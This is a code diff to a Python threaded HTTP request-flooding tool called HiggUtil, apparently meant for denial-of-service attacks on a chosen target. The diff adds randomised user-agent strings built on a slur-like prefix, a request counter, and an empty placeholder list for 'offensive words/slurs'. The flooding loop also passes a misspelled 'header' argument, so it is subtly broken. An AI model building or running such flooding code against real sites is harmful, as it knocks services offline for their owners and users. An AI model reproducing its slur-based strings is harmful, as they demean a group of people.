@@ -4,6 +4,7 @@ from datetime import timedelta
 import time
 import requests
 import threading
+import random
 
 print("HIGGERSutility - HiggUtil - Version 1.0 'Cold Mountains' - cablesalty")
 
@@ -12,12 +13,50 @@ class settings:
     userset_useragent = False
 
     uarand = "words"
+    wordlist = [
+        "Preview",
+        "WATAPP",
+        "Muzsika",
+        "Grapefruit",
+        "GEEARS",
+        "WORP",
+        "LLO",
+        "eyeMessages",
+        "Arcs",
+        "Binbows",
+        "Launchpad",
+        "Finder",
+        "Case",
+        "ZDNG",
+        "Opera Singer",
+        "TemuSpeak",
+        "TeamSpeka",
+        "Discoid",
+        "DISCORDO",
+        "Weather Station",
+        "Events",
+        "Sticky Notes",
+        "iTERM",
+        "Terminal",
+        "Docking Station",
+        "Security Camera",
+        "Smart Plug",
+        "Smart Bulb",
+        "Movement Sensor",
+        "Light Sensor",
+        "EkisCode",
+    ]
+
+    offensivewordlist = [
+        # Will do later
+    ]
     useragent = ""
 
     targetthreads = 1
     openthreads = 0
     threads = []
 
+    reqmade = 0
     running = False
     target = ""
 
@@ -38,7 +77,24 @@ print()
 
 def reqattack(target, stop_event):
     while not stop_event.is_set():
-        requests.get(target, header={})
+        if settings.userset_useragent:
+            header = {
+                "user-agent": "Higgers " + settings.useragent
+            }
+        elif settings.uarand == "words":
+            header = {
+                "user-agent": "Higgers " + random.choice(settings.wordlist)
+            }
+        elif settings.uarand == "num":
+            header = {
+                "user-agent": "Higgers " + str(random.randrange(11111, 99999))
+            }
+        else:
+            header = {
+                "user-agent": "Higgers " + random.choice(settings.wordlist)
+            }
+        requests.get(target, header=header)
+        settings.reqmade += 1
 
 while True:
     if settings.running:
@@ -71,9 +127,9 @@ while True:
         if mode == "":
             overwrite_protection = False
             print("Value: " + settings.uarand)
-        elif mode == "randomchar" or mode == "randchar":
-            settings.uarand = "randchar"
-            print("Set User Agent Randomizer to Random Characters")
+        # elif mode == "randomchar" or mode == "randchar":
+        #     settings.uarand = "randchar"
+        #     print("Set User Agent Randomizer to Random Characters")
         elif mode == "numbers" or mode == "nums":
             settings.uarand = "nums"
             print("Set User Agent Randomizer to Random Numbers")
@@ -81,8 +137,10 @@ while True:
             settings.uarand = "words"
             print("Set User Agent Randomizer to Words")
         elif mode == "offensive":
-            settings.uarand = "offensive"
-            print("Set User Agent Randomizer to Offensive Words/Slurs")
+            # settings.uarand = "offensive"
+            # print("Set User Agent Randomizer to Offensive Words/Slurs")
+            settings.uarand = "words"
+            print("!! WARNING !! Set User Agent Randomizer to Words (Offensive wordlist unavailable)")
         else:
             print("!!! ERROR !!! ILLEGAL option!")
             successful = False
